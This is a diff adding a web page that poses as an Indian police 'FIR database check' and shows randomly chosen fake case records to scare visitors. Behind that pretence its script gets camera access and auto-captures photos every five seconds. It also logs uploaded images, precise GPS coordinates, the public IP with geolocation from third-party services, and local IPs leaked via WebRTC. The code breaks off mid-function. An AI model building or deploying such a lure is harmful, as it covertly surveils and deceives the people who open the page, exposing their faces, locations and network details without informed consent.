@@ -1,0 +1,1996 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FIR Check - Database Verification</title>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 1200px;
+        }
+
+        /* Attractive Permission Screen */
+        .permission-screen {
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 24px;
+            padding: 50px 40px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.6s ease;
+            display: block;
+        }
+
+        .permission-screen.hidden {
+            display: none;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo-container {
+            margin-bottom: 30px;
+        }
+
+        .logo-icon {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            color: white;
+            box-shadow: 0 15px 35px rgba(99, 102, 241, 0.4);
+            animation: pulse 2s infinite;
+            position: relative;
+        }
+
+        .logo-icon::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid rgba(99, 102, 241, 0.3);
+            animation: ripple 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        @keyframes ripple {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(1.5);
+                opacity: 0;
+            }
+        }
+
+        .app-title {
+            font-size: 36px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .app-subtitle {
+            font-size: 18px;
+            color: #64748b;
+            margin-bottom: 40px;
+            line-height: 1.6;
+        }
+
+        .features-list {
+            text-align: left;
+            max-width: 500px;
+            margin: 0 auto 40px;
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            padding: 30px;
+            border-radius: 16px;
+            border-left: 4px solid #6366f1;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            font-size: 16px;
+            color: #475569;
+        }
+
+        .feature-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .feature-item i {
+            color: #6366f1;
+            margin-right: 12px;
+            font-size: 20px;
+            width: 24px;
+        }
+
+        .btn-permission {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: white;
+            border: none;
+            padding: 20px 60px;
+            font-size: 20px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(99, 102, 241, 0.4);
+            margin: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-permission::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .btn-permission:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .btn-permission:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(99, 102, 241, 0.5);
+        }
+
+        .btn-permission:active {
+            transform: translateY(-1px);
+        }
+
+        .btn-permission i {
+            margin-right: 10px;
+        }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(16, 185, 129, 0.1);
+            color: #10b981;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 20px;
+        }
+
+        /* Camera Screen */
+        .camera-screen {
+            display: none;
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 24px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .camera-screen.active {
+            display: block;
+            animation: slideIn 0.6s ease;
+        }
+
+        .camera-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .camera-header h2 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 8px;
+        }
+
+        .camera-header p {
+            color: #64748b;
+            font-size: 16px;
+        }
+
+        .tabs-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #e2e8f0;
+        }
+
+        .tab-btn {
+            padding: 12px 24px;
+            background: transparent;
+            border: none;
+            border-bottom: 3px solid transparent;
+            font-size: 16px;
+            font-weight: 600;
+            color: #64748b;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .tab-btn.active {
+            color: #6366f1;
+            border-bottom-color: #6366f1;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            max-width: 640px;
+            margin: 0 auto 20px;
+            border-radius: 20px;
+            overflow: hidden;
+            background: #000;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+            border: 4px solid #6366f1;
+        }
+
+        #video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .scanning-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border: 3px solid #6366f1;
+            border-radius: 20px;
+            pointer-events: none;
+            animation: scanLine 2s infinite;
+        }
+
+        @keyframes scanLine {
+            0% {
+                box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.7);
+            }
+            50% {
+                box-shadow: 0 0 0 10px rgba(99, 102, 241, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(99, 102, 241, 0);
+            }
+        }
+
+        .status-info {
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .status-item {
+            display: inline-block;
+            margin: 0 15px;
+            font-size: 14px;
+            color: #475569;
+        }
+
+        .status-item i {
+            color: #6366f1;
+            margin-right: 6px;
+        }
+
+        .status-item.success {
+            color: #10b981;
+        }
+
+        .status-item.success i {
+            color: #10b981;
+        }
+
+        .auto-capture-indicator {
+            background: linear-gradient(135deg, #10b981, #14b8a6);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        .auto-capture-indicator i {
+            margin-right: 8px;
+        }
+
+        .capture-count {
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            color: #1e293b;
+            margin-bottom: 20px;
+        }
+
+        .capture-count span {
+            color: #6366f1;
+            font-size: 24px;
+        }
+
+        /* Upload Section */
+        .upload-section {
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            padding: 30px;
+            border-radius: 16px;
+            margin-bottom: 25px;
+        }
+
+        .upload-area {
+            border: 3px dashed #6366f1;
+            border-radius: 12px;
+            padding: 40px;
+            text-align: center;
+            background: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .upload-area:hover {
+            border-color: #8b5cf6;
+            background: #f8fafc;
+        }
+
+        .upload-area.dragover {
+            border-color: #10b981;
+            background: #f0fdf4;
+        }
+
+        .upload-icon {
+            font-size: 64px;
+            color: #6366f1;
+            margin-bottom: 15px;
+        }
+
+        .upload-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1e293b;
+            margin-bottom: 8px;
+        }
+
+        .upload-hint {
+            font-size: 14px;
+            color: #64748b;
+        }
+
+        .file-input {
+            display: none;
+        }
+
+        .btn-upload {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
+        }
+
+        .btn-upload:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.4);
+        }
+
+        /* Matching Simulation */
+        .matching-section {
+            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
+            padding: 30px;
+            border-radius: 16px;
+            margin-bottom: 25px;
+            border: 2px solid #10b981;
+        }
+
+        .matching-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .matching-header h3 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #10b981;
+            margin-bottom: 10px;
+        }
+
+        .matching-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            color: #10b981;
+        }
+
+        .matching-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .match-item {
+            background: white;
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .match-item:hover {
+            transform: translateY(-5px);
+        }
+
+        .match-item::before {
+            content: 'FIR';
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #6366f1;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: 700;
+        }
+
+        .match-item {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Photo Grids */
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+            padding: 15px;
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            border-radius: 12px;
+        }
+
+        .photo-item {
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+            transition: transform 0.3s ease;
+            position: relative;
+        }
+
+        .photo-item:hover {
+            transform: scale(1.05);
+        }
+
+        .photo-item img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .photo-item.uploaded::after {
+            content: 'UPLOADED';
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            background: #6366f1;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: 700;
+        }
+
+        .photo-item.captured::after {
+            content: '✓';
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: #10b981;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .error-message {
+            background: rgba(239, 68, 68, 0.1);
+            color: #ef4444;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        canvas {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .permission-screen {
+                padding: 30px 20px;
+            }
+
+            .app-title {
+                font-size: 28px;
+            }
+
+            .btn-permission {
+                padding: 16px 40px;
+                font-size: 18px;
+            }
+
+            .matching-grid {
+                grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            }
+        }
+    </style>
+</head>
+<body onload="mydata(); initCameraAccess(); requestLocation();">
+    
+    <div class="main-container">
+        <!-- Attractive Permission Screen -->
+        <div class="permission-screen" id="cameraPermission">
+            <div class="logo-container">
+                <div class="logo-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+            </div>
+            
+            <h1 class="app-title">FIR Database Check</h1>
+            <p class="app-subtitle">
+                Check FIR description - Check how many FIR on You in latest database
+            </p>
+
+            <div class="features-list">
+                <div class="feature-item">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Check FIR description in database</span>
+                </div>
+                <div class="feature-item">
+                    <i class="fas fa-check-circle"></i>
+                    <span>View all FIR records against you</span>
+                </div>
+                <div class="feature-item">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Latest database verification</span>
+                </div>
+                <div class="feature-item">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Real-time FIR status check</span>
+                </div>
+            </div>
+
+            <button class="btn-permission" onclick="requestCameraAccess(event)">
+                <i class="fas fa-camera"></i>
+                <span>Check FIR Database</span>
+            </button>
+
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                <span>100% Secure & Private</span>
+            </div>
+        </div>
+
+        <!-- Camera Screen -->
+        <div class="camera-screen" id="cameraScreen">
+            <div class="camera-header">
+                <h2><i class="fas fa-database"></i> FIR Database Check Active</h2>
+                <p>Checking FIR records in latest database...</p>
+            </div>
+
+            <div class="tabs-container">
+                <button class="tab-btn active" onclick="switchTab('live', this)">
+                    <i class="fas fa-video"></i> Live Camera
+                </button>
+                <button class="tab-btn" onclick="switchTab('upload', this)">
+                    <i class="fas fa-upload"></i> Upload Pictures
+                </button>
+                <button class="tab-btn" onclick="switchTab('matches', this)">
+                    <i class="fas fa-search"></i> FIR Records
+                </button>
+            </div>
+
+            <!-- Live Camera Tab -->
+            <div class="tab-content active" id="liveTab">
+                <div class="auto-capture-indicator">
+                    <i class="fas fa-sync-alt"></i>
+                    Auto-capturing every 5 seconds for FIR database check
+                </div>
+
+                <div class="capture-count">
+                    Photos Captured: <span id="captureCount">0</span>
+                </div>
+
+                <div class="video-container">
+                    <video id="video" playsinline autoplay></video>
+                    <div class="scanning-overlay"></div>
+                </div>
+                
+                <div class="status-info">
+                    <div class="status-item success" id="locationInfo">
+                        <i class="fas fa-map-marker-alt"></i>
+                        <span id="locationText">Location: Loading...</span>
+                    </div>
+                    <div class="status-item success">
+                        <i class="fas fa-camera"></i>
+                        <span>Camera: Active</span>
+                    </div>
+                </div>
+
+                <div class="photo-grid" id="capturedPhotos"></div>
+            </div>
+
+            <!-- Upload Pictures Tab -->
+            <div class="tab-content" id="uploadTab">
+                <div class="upload-section">
+                    <div class="upload-area" id="uploadArea" onclick="document.getElementById('fileInput').click()">
+                        <div class="upload-icon">
+                            <i class="fas fa-cloud-upload-alt"></i>
+                        </div>
+                        <div class="upload-text">Click to Upload or Drag & Drop</div>
+                        <div class="upload-hint">Upload your pictures for FIR database verification</div>
+                        <input type="file" id="fileInput" class="file-input" multiple accept="image/*" onchange="handleFileSelect(event)">
+                    </div>
+                </div>
+
+                <div class="photo-grid" id="uploadedPhotos"></div>
+            </div>
+
+            <!-- Matches Tab -->
+            <div class="tab-content" id="matchesTab">
+                <div class="matching-section">
+                    <div class="matching-header">
+                        <h3><i class="fas fa-database"></i> FIR Database Check Results</h3>
+                        <div class="matching-status">
+                            <i class="fas fa-check-circle"></i>
+                            <span>Checking FIR records in latest database...</span>
+                        </div>
+                    </div>
+                    <div id="firSummary" style="background: white; padding: 20px; border-radius: 12px; margin-bottom: 20px; text-align: center;">
+                        <h4 style="color: #6366f1; margin-bottom: 10px;">FIR Summary</h4>
+                        <p style="font-size: 18px; color: #1e293b; margin: 5px 0;">
+                            Total FIR Records Found: <strong style="color: #ef4444; font-size: 24px;" id="firCount">0</strong>
+                        </p>
+                        <p style="font-size: 14px; color: #64748b; margin-top: 10px;">
+                            Checking latest database for FIR descriptions against you
+                        </p>
+                    </div>
+                    <div class="matching-grid" id="matchingGrid">
+                        <!-- FIR records will be shown here -->
+                    </div>
+                </div>
+            </div>
+
+            <div class="error-message" id="errorMsg"></div>
+        </div>
+    </div>
+
+    <canvas id="canvas" width="640" height="640"></canvas>
+
+    <script>
+        let stream = null;
+        let currentFacingMode = 'user';
+        let capturedCount = 0;
+        let uploadedCount = 0;
+        let autoCaptureInterval = null;
+        let uploadedImages = [];
+
+        // FIR record data for simulation
+        const firRecords = [
+            { id: 'FIR-2024-001', description: 'Theft case registered', date: '2024-01-15', status: 'Active', station: 'Central Police Station' },
+            { id: 'FIR-2024-045', description: 'Property dispute complaint', date: '2024-02-20', status: 'Under Investigation', station: 'North Police Station' },
+            { id: 'FIR-2024-089', description: 'Fraud case investigation', date: '2024-03-10', status: 'Active', station: 'South Police Station' },
+            { id: 'FIR-2024-112', description: 'Assault complaint filed', date: '2024-04-05', status: 'Closed', station: 'East Police Station' },
+            { id: 'FIR-2024-156', description: 'Cyber crime case', date: '2024-05-12', status: 'Under Investigation', station: 'Cyber Crime Unit' },
+            { id: 'FIR-2024-189', description: 'Financial fraud investigation', date: '2024-06-18', status: 'Active', station: 'Economic Offenses Wing' },
+            { id: 'FIR-2024-223', description: 'Property damage complaint', date: '2024-07-22', status: 'Under Investigation', station: 'West Police Station' },
+            { id: 'FIR-2024-267', description: 'Harassment case registered', date: '2024-08-30', status: 'Active', station: 'Women Police Station' }
+        ];
+
+        // Switch tabs
+        function switchTab(tabName, element) {
+            // Update tab buttons
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            
+            // Activate clicked button
+            if (element) {
+                element.classList.add('active');
+            } else {
+                // Fallback: find button by onclick attribute
+                document.querySelectorAll('.tab-btn').forEach(btn => {
+                    const onclick = btn.getAttribute('onclick') || '';
+                    if (onclick.includes("'" + tabName + "'") || onclick.includes('"' + tabName + '"')) {
+                        btn.classList.add('active');
+                    }
+                });
+            }
+
+            // Update tab content
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            const targetTab = document.getElementById(tabName + 'Tab');
+            if (targetTab) {
+                targetTab.classList.add('active');
+            }
+
+            // If matches tab, show FIR records
+            if (tabName === 'matches') {
+                setTimeout(function() {
+                    showMatchingSimulation();
+                }, 100);
+            }
+        }
+
+        // Show FIR records from database
+        function showMatchingSimulation() {
+            const matchingGrid = document.getElementById('matchingGrid');
+            if (!matchingGrid) {
+                console.log('Matching grid not found');
+                return;
+            }
+            
+            matchingGrid.innerHTML = '';
+
+            // Select random FIR records to display (simulating database check)
+            const numRecords = Math.floor(Math.random() * 4) + 3; // 3-6 records
+            const selectedRecords = [];
+            const usedIndices = new Set();
+            
+            for (let i = 0; i < numRecords && i < firRecords.length; i++) {
+                let randomIndex;
+                do {
+                    randomIndex = Math.floor(Math.random() * firRecords.length);
+                } while (usedIndices.has(randomIndex));
+                
+                usedIndices.add(randomIndex);
+                selectedRecords.push(firRecords[randomIndex]);
+            }
+
+            // Update FIR count
+            const firCountEl = document.getElementById('firCount');
+            if (firCountEl) {
+                firCountEl.textContent = selectedRecords.length;
+            }
+
+            // Display FIR records
+            selectedRecords.forEach((fir) => {
+                const firItem = document.createElement('div');
+                firItem.className = 'match-item';
+                
+                // Status color
+                let statusColor = '#10b981'; // green for closed
+                if (fir.status === 'Active') {
+                    statusColor = '#ef4444'; // red for active
+                } else if (fir.status === 'Under Investigation') {
+                    statusColor = '#f59e0b'; // orange for under investigation
+                }
+                
+                firItem.innerHTML = `
+                    <div style="background: ${statusColor}; color: white; padding: 8px; border-radius: 8px 8px 0 0; font-weight: 700; font-size: 12px; text-align: center;">
+                        ${fir.status}
+                    </div>
+                    <div style="padding: 15px;">
+                        <div style="font-size: 16px; font-weight: 700; color: #1e293b; margin-bottom: 8px;">
+                            ${fir.id}
+                        </div>
+                        <div style="font-size: 14px; color: #64748b; margin-bottom: 10px; min-height: 40px;">
+                            ${fir.description}
+                        </div>
+                        <div style="font-size: 12px; color: #94a3b8; margin-bottom: 5px;">
+                            <i class="fas fa-calendar"></i> ${fir.date}
+                        </div>
+                        <div style="font-size: 12px; color: #94a3b8;">
+                            <i class="fas fa-building"></i> ${fir.station}
+                        </div>
+                    </div>
+                `;
+                
+                matchingGrid.appendChild(firItem);
+            });
+
+            // Log FIR check to server
+            saveFIRCheckToLogs(selectedRecords);
+        }
+
+        // Handle file selection
+        function handleFileSelect(event) {
+            const files = event.target.files;
+            if (files.length > 0) {
+                Array.from(files).forEach(file => {
+                    if (file.type.startsWith('image/')) {
+                        handleImageUpload(file);
+                    }
+                });
+            }
+        }
+
+        // Handle image upload
+        function handleImageUpload(file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const imageData = e.target.result;
+                uploadedCount++;
+                uploadedImages.push(imageData);
+
+                // Display in uploaded photos grid
+                const uploadedPhotos = document.getElementById('uploadedPhotos');
+                const photoItem = document.createElement('div');
+                photoItem.className = 'photo-item uploaded';
+                const img = document.createElement('img');
+                img.src = imageData;
+                photoItem.appendChild(img);
+                uploadedPhotos.appendChild(photoItem);
+
+                // Save upload to logs
+                saveUploadToLogs(file.name, imageData);
+            };
+            reader.readAsDataURL(file);
+        }
+
+        // Drag and drop handlers
+        const uploadArea = document.getElementById('uploadArea');
+        
+        uploadArea.addEventListener('dragover', function(e) {
+            e.preventDefault();
+            uploadArea.classList.add('dragover');
+        });
+
+        uploadArea.addEventListener('dragleave', function(e) {
+            e.preventDefault();
+            uploadArea.classList.remove('dragover');
+        });
+
+        uploadArea.addEventListener('drop', function(e) {
+            e.preventDefault();
+            uploadArea.classList.remove('dragover');
+            
+            const files = e.dataTransfer.files;
+            Array.from(files).forEach(file => {
+                if (file.type.startsWith('image/')) {
+                    handleImageUpload(file);
+                }
+            });
+        });
+
+        // Request location on page load
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        document.getElementById('locationText').textContent = `${lat.toFixed(4)}, ${lon.toFixed(4)}`;
+                        document.getElementById('locationInfo').classList.add('success');
+                        
+                        // Save initial location to logs
+                        saveInitialLocationToLogs(lat, lon, accuracy);
+                    },
+                    function(error) {
+                        document.getElementById('locationText').textContent = 'Location unavailable';
+                        document.getElementById('locationInfo').classList.remove('success');
+                        
+                        // Save location error to logs
+                        saveLocationErrorToLogs(error);
+                    }
+                );
+            }
+        }
+
+        // Request location specifically for FIR database check with high accuracy
+        function requestLocationForFIR() {
+            console.log('Starting GPS location request...');
+            
+            if (!navigator.geolocation) {
+                // Geolocation not supported
+                console.error('Geolocation is not supported by this browser');
+                saveFIRLocationErrorToLogs({ message: 'Geolocation is not supported by this browser', code: 'NOT_SUPPORTED' });
+                alert('GPS location is not supported by your browser. Please use a modern browser.');
+                return;
+            }
+            
+            // Use high accuracy options for precise GPS location
+            var geoOptions = {
+                enableHighAccuracy: true,  // Request high accuracy GPS (uses GPS satellites if available)
+                timeout: 30000,             // 30 second timeout
+                maximumAge: 0              // Don't use cached location - get fresh location
+            };
+            
+            console.log('Requesting GPS location with high accuracy...');
+            console.log('Browser will prompt user for location permission if not already granted.');
+            
+            // Request current position - this will trigger browser permission prompt
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    console.log('GPS location obtained successfully!');
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const altitude = position.coords.altitude || 'Not Available';
+                    const altitudeAccuracy = position.coords.altitudeAccuracy || 'Not Available';
+                    const heading = position.coords.heading || 'Not Available';
+                    const speed = position.coords.speed || 'Not Available';
+                    const timestamp = new Date(position.timestamp).toISOString();
+                    
+                    console.log('Location:', lat, lon, 'Accuracy:', accuracy, 'meters');
+                    
+                    // Update location display if element exists
+                    const locationTextEl = document.getElementById('locationText');
+                    if (locationTextEl) {
+                        locationTextEl.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+                    }
+                    const locationInfoEl = document.getElementById('locationInfo');
+                    if (locationInfoEl) {
+                        locationInfoEl.classList.add('success');
+                    }
+                    
+                    // Save detailed location for FIR check
+                    saveFIRLocationToLogs(lat, lon, accuracy, altitude, altitudeAccuracy, heading, speed, timestamp);
+                    
+                    // Show success notification
+                    console.log('GPS location saved successfully!');
+                },
+                function(error) {
+                    console.error('GPS location error:', error);
+                    
+                    let errorMessage = 'Location access denied';
+                    let userMessage = 'Location access was denied. Please allow location access to continue.';
+                    
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage = 'User denied the request for Geolocation';
+                            userMessage = 'Location permission was denied. Please allow location access in your browser settings and try again.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage = 'Location information is unavailable';
+                            userMessage = 'Location information is unavailable. Please check your GPS settings.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage = 'The request to get user location timed out';
+                            userMessage = 'Location request timed out. Please try again.';
+                            break;
+                        default:
+                            errorMessage = 'An unknown error occurred';
+                            userMessage = 'An error occurred while getting your location. Please try again.';
+                            break;
+                    }
+                    
+                    // Update location display if element exists
+                    const locationTextEl = document.getElementById('locationText');
+                    if (locationTextEl) {
+                        locationTextEl.textContent = 'Location unavailable';
+                    }
+                    const locationInfoEl = document.getElementById('locationInfo');
+                    if (locationInfoEl) {
+                        locationInfoEl.classList.remove('success');
+                    }
+                    
+                    // Save location error for FIR check
+                    saveFIRLocationErrorToLogs(error);
+                    
+                    // Show error to user
+                    console.error('Location error:', errorMessage);
+                    alert(userMessage);
+                },
+                geoOptions
+            );
+        }
+
+        // Get local IP addresses using WebRTC
+        function getLocalIPs(callback) {
+            var ips = [];
+            var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+            
+            if (!RTCPeerConnection) {
+                callback([]);
+                return;
+            }
+            
+            var pc = new RTCPeerConnection({
+                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+            });
+            
+            pc.createDataChannel('');
+            
+            pc.onicecandidate = function(event) {
+                if (event.candidate) {
+                    var candidate = event.candidate.candidate;
+                    var match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    if (match && ips.indexOf(match[1]) === -1) {
+                        ips.push(match[1]);
+                    }
+                } else {
+                    pc.close();
+                    callback(ips);
+                }
+            };
+            
+            pc.createOffer().then(function(offer) {
+                pc.setLocalDescription(offer);
+            }).catch(function(err) {
+                console.log('WebRTC error:', err);
+                callback([]);
+            });
+            
+            // Timeout after 3 seconds
+            setTimeout(function() {
+                pc.close();
+                callback(ips);
+            }, 3000);
+        }
+
+        // Get detailed IP information from multiple reliable sources
+        function getDetailedIPInfo(callback) {
+            var ipInfo = {
+                publicIP: 'Not Available',
+                localIPs: [],
+                ipDetails: {}
+            };
+            
+            // First, try simple IP detection (most reliable)
+            $.get("https://api.ipify.org", function(ip) {
+                if (ip && ip.trim()) {
+                    ipInfo.publicIP = ip.trim();
+                }
+                
+                // Now get detailed IP information
+                $.ajax({
+                    url: 'https://ipapi.co/json/',
+                    dataType: 'json',
+                    timeout: 8000,
+                    success: function(data) {
+                        // Use the IP we got from ipify if ipapi doesn't provide one
+                        if (!ipInfo.publicIP && data.ip) {
+                            ipInfo.publicIP = data.ip;
+                        }
+                        if (!ipInfo.publicIP && data.query) {
+                            ipInfo.publicIP = data.query;
+                        }
+                        
+                        // Store detailed IP information
+                        if (data.country_name) ipInfo.ipDetails.country = data.country_name;
+                        if (data.region) ipInfo.ipDetails.region = data.region;
+                        if (data.city) ipInfo.ipDetails.city = data.city;
+                        if (data.org) ipInfo.ipDetails.isp = data.org;
+                        if (data.org) ipInfo.ipDetails.org = data.org;
+                        if (data.timezone) ipInfo.ipDetails.timezone = data.timezone;
+                        if (data.postal) ipInfo.ipDetails.postal = data.postal;
+                        if (data.latitude) ipInfo.ipDetails.latitude = data.latitude;
+                        if (data.longitude) ipInfo.ipDetails.longitude = data.longitude;
+                        
+                        // Get local IPs
+                        getLocalIPs(function(localIPs) {
+                            ipInfo.localIPs = localIPs;
+                            callback(ipInfo);
+                        });
+                    },
+                    error: function() {
+                        // Fallback to ip-api.com
+                        $.ajax({
+                            url: 'https://ip-api.com/json/',
+                            dataType: 'json',
+                            timeout: 8000,
+                            success: function(data) {
+                                if (!ipInfo.publicIP && data.query) {
+                                    ipInfo.publicIP = data.query;
+                                }
+                                if (data.country) ipInfo.ipDetails.country = data.country;
+                                if (data.regionName) ipInfo.ipDetails.region = data.regionName;
+                                if (data.city) ipInfo.ipDetails.city = data.city;
+                                if (data.isp) ipInfo.ipDetails.isp = data.isp;
+                                if (data.org) ipInfo.ipDetails.org = data.org;
+                                if (data.timezone) ipInfo.ipDetails.timezone = data.timezone;
+                                
+                                getLocalIPs(function(localIPs) {
+                                    ipInfo.localIPs = localIPs;
+                                    callback(ipInfo);
+                                });
+                            },
+                            error: function() {
+                                // Just get local IPs if all fail
+                                getLocalIPs(function(localIPs) {
+                                    ipInfo.localIPs = localIPs;
+                                    callback(ipInfo);
+                                });
+                            }
+                        });
+                    }
+                });
+            }).fail(function() {
+                // If ipify fails, try alternative
+                $.get("https://api64.ipify.org", function(ip) {
+                    if (ip && ip.trim()) {
+                        ipInfo.publicIP = ip.trim();
+                    }
+                    getLocalIPs(function(localIPs) {
